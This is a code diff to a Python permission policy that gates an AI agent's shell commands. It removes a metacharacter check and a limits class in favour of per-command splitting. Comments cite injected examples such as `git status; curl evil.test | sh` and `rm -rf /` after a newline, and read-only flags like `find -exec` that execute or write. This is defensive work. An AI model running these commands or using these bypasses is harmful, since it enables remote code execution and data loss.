@@ -100,10 +100,9 @@ POLICY: dict[str, dict[str, str]] = {
     MODE_PLAN: {RISK_READ: ALLOW, RISK_WRITE: ASK, RISK_EXECUTE: ASK},
 }
 
-# A shell metacharacter makes a command line unmatchable, so no pattern may be
-# applied to it. Without this, `git *` in an allow list also matches
-# `git status; curl evil.test | sh`, which is the whole ballgame. That half is
-# absolute and is what this constant exists for.
+# A shell metacharacter makes a command line unmatchable as a whole, so no
+# pattern may be applied to it as one. Without that, `git *` in an allow list
+# also matches `git status; curl evil.test | sh`, which is the whole ballgame.
 #
 # The deny list is the other half, and it has been decided both ways. There was
 # once a rule that an unmatchable line ASKed whenever a deny list existed at
@@ -123,18 +122,16 @@ POLICY: dict[str, dict[str, str]] = {
 # split into its simple commands (`shell.split_command`), and each is checked
 # against the deny list both as written and in its plain spelling
 # (`shell.plain_commands`). An allow needs every command allowed and nothing the
-# split could not see (substitution, redirection to a file, `eval`...). `_UNSAFE`
-# remains only for `subject`, the single-pattern form older callers use.
-_UNSAFE = re.compile(r"[;&|<>`$\n\\()]")
+# split could not see (substitution, redirection to a file, `eval`...).
 
 # Flags that turn a "read-only" command into one that writes or executes, on
 # tools whose *name* is on somebody's allow list.
 #
-# `_UNSAFE` stops a command line being composed out of two commands. It does
+# The split stops a command line being composed out of two commands. It does
 # nothing about a single command that composes one itself, and several of the
 # obvious read-only tools do: `find -exec cmd +` runs a program, `-fprintf`
 # writes a file, `-delete` removes one, and `rg --pre` runs a preprocessor for
-# every file it opens. None of those needs a character `_UNSAFE` refuses, so
+# every file it opens. None of those needs a character the split refuses, so
 # `find *` on an allow list -- which is what a subagent gets, in every mode --
 # was arbitrary write and arbitrary execution wearing a read-only name.
 #
@@ -163,55 +160,6 @@ _ACTION = re.compile(
 class Decision:
     verdict: str
     reason: str = ""
-
-
-@dataclass(frozen=True)
-class Limits:
-    """What one agent reply may spend.
-
-    Four axes because they fail differently. Wall clock stops a single slow
-    command eating an afternoon; `output_bytes` stops a model filling its own
-    context with build logs and having no room left to answer; and
-    `completion_tokens` stops one that keeps writing.
-
-    `steps` is the odd one out. It is a **runaway backstop, not a working
-    budget** -- an agent reply is meant to run until the task is finished, and a
-    step count low enough to be the thing that ends it is a count that ends it
-    halfway. It was 40, which is a working budget, and it was reached. Anything
-    that wants a real ceiling should set `completion_tokens`, which measures
-    what a long reply actually costs.
-
-    `completion_tokens` of 0 means no ceiling, the same convention `index_chars`
-    uses in the settings store.
-    """
-
-    steps: int = 200
-    wall_seconds: float = 900.0
-    output_bytes: int = 1024 * 1024
-    completion_tokens: int = 200_000
-
-
-def subject(tool_name: str, command: str = "") -> str | None:
-    """What a pattern is matched against, or None when nothing may match it.
-
-    For everything but a command it is the tool name, so `file_read` in an
-    allow list means "reading files never asks". For `shell_run` it is the
-    command line, normalised -- unless it contains anything that composes two
-    commands into one, in which case no pattern is allowed to match at all.
-    """
-    if tool_name != "shell_run":
-        return tool_name
-    raw = command or ""
-    # Checked BEFORE whitespace is normalised. Collapsing runs of whitespace
-    # first would turn "git status\nrm -rf /" into a single innocent-looking
-    # line and let it match `git *` -- a newline separates two commands exactly
-    # as a semicolon does.
-    if _UNSAFE.search(raw):
-        return None
-    line = " ".join(raw.split())
-    if _ACTION.search(line):
-        return None
-    return line or None
 
 
 def _matches(patterns: tuple[str, ...], candidate: str | None) -> str:
@@ -313,7 +261,7 @@ def decide(
     0. **The hardline and the protected paths refuse** (`refusal`), before the
        lists and the mode, in every mode, Auto included.
 
-    A command line is judged command by command (see the note above `_UNSAFE`):
+    A command line is judged command by command (see the note above `_ACTION`):
     a deny-list entry matching any of them, as written or spelled plainly, asks;
     an allow needs all of them.
 
@@ -396,7 +344,5 @@ __all__ = [
     "MODE_PLAN",
     "POLICY",
     "Decision",
-    "Limits",
     "decide",
-    "subject",
 ]
